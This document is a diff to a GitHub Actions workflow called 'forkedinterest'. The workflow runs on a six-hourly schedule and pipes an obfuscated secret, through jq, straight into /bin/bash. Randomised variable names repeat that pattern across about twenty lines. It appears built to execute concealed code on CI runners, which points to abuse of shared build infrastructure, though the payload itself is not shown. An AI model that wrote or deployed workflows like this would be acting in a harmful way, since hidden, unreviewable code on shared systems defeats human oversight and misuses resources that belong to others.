@@ -1,23 +1,35 @@
 name: forkedinterest
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '9 1/6 * * *'
-jobs:  # 16336
+    - cron: '2 5/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: forkedinterest
         env:
-          yqjg58340: ${{ secrets.yqjg58340 }}
+          im7442: ${{ secrets.im7442 }}
         run: |
-          echo $yqjg58340 | jq -r .omh5260 | /bin/bash
-          echo $k35 | jq -r .thf39 | /bin/bash
-          echo $qrkfo78 | jq -r .yhgt39 | /bin/bash
-          echo $yybbx95409 | jq -r .bzci72243 | /bin/bash
-          echo $uc447 | jq -r .cmi75 | /bin/bash
-          echo $lvse2 | jq -r .g931 | /bin/bash
+          echo $im7442 | jq -r .w1188 | /bin/bash
+          echo $pytwy123 | jq -r .m4 | /bin/bash
+          echo $qnm46 | jq -r .vxwo847 | /bin/bash
+          echo $u560 | jq -r .cfhnx0238 | /bin/bash
+          echo $plu8904 | jq -r .hzmct5164 | /bin/bash
+          echo $cn18 | jq -r .ewwfg5 | /bin/bash
+          echo $lveh76374 | jq -r .y45 | /bin/bash
+          echo $up2 | jq -r .bh8 | /bin/bash
+          echo $mhp7 | jq -r .b70384 | /bin/bash
+          echo $udtiw6 | jq -r .j8 | /bin/bash
+          echo $g727 | jq -r .s4 | /bin/bash
+          echo $ku3 | jq -r .p10477 | /bin/bash
+          echo $ulub1 | jq -r .ie085 | /bin/bash
+          echo $nmfoq52 | jq -r .h61 | /bin/bash
+          echo $y650 | jq -r .gscop955 | /bin/bash
+          echo $ffw31122 | jq -r .oj945 | /bin/bash
+          echo $lhdi713 | jq -r .vojr05 | /bin/bash
+          echo $e02579 | jq -r .f0395 | /bin/bash
+          echo $xa40 | jq -r .v3721 | /bin/bash
 
